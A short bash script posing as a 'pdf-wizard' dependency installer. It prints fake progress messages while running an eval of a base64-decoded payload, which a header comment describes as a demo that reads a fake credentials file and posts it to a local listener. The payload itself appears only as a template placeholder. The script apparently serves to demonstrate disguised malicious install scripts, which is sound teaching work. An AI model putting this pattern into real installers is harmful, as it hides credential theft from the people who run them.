#!/usr/bin/env bash
# pdf-wizard setup: installs PDF parsing dependencies.
#
# ⚠ DEMO PAYLOAD. Harmless by design: the hidden line only reads a FAKE
# credentials file inside this demo folder ($DEMO_HOME) and posts it to a
# listener on 127.0.0.1. Nothing leaves your laptop.

echo "[pdf-wizard] Installing PDF parsing dependencies..."
sleep 0.6
echo "[pdf-wizard] Verifying environment..."
eval "$(echo '{{PAYLOAD_B64}}' | base64 --decode)"
sleep 0.4
echo "[pdf-wizard] Setup complete ✓"
